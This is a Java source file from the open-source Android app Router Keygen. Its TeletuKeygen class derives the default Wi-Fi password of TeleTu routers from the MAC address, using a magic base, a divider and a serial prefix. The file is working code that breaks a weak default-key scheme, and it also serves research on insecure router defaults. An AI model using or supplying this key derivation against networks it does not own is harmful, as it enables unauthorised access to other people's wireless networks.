/*
 * Copyright 2012 Rui Araújo, Luís Fonseca
 *
 * This file is part of Router Keygen.
 *
 * Router Keygen is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Router Keygen is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Router Keygen.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.exobel.routerkeygen.algorithms;

import java.util.List;

import org.exobel.routerkeygen.config.TeleTuMagicInfo;

import android.os.Parcel;
import android.os.Parcelable;
/*
 * Using the last 6 bytes of the mac address which should be in a certain range
 * in the config file, we calculate the end of the serial number
 * which is the password.
 * 
 * The serial number is the decimal string of the difference between the last 6 bytes
 * of the mac address and a magic number and then divided by another magic number.
 */
public class TeletuKeygen extends Keygen {

	final private TeleTuMagicInfo magicInfo;

	public TeletuKeygen(String ssid, String mac, int level, String enc,
			TeleTuMagicInfo magicInfo) {
		super(ssid, mac, level, enc);
		this.magicInfo = magicInfo;
	}

	@Override
	public List<String> getKeys() {
		String serialEnd = Integer.toString((Integer.parseInt(getMacAddress()
				.substring(6), 16) - magicInfo.getBase())
				/ magicInfo.getDivider());
		while (serialEnd.length() < 7) {
			serialEnd = "0" + serialEnd;
		}
		addPassword(magicInfo.getSerial() + "Y" + serialEnd);
		return getResults();
	}

	private TeletuKeygen(Parcel in) {
		super(in);
		magicInfo = in.readParcelable(TeleTuMagicInfo.class.getClassLoader());
	}

	public void writeToParcel(Parcel dest, int flags) {
		super.writeToParcel(dest, flags);
		dest.writeParcelable(magicInfo, flags);
	}

	public static final Parcelable.Creator<TeletuKeygen> CREATOR = new Parcelable.Creator<TeletuKeygen>() {
		public TeletuKeygen createFromParcel(Parcel in) {
			return new TeletuKeygen(in);
		}

		public TeletuKeygen[] newArray(int size) {
			return new TeletuKeygen[size];
		}
	};

}
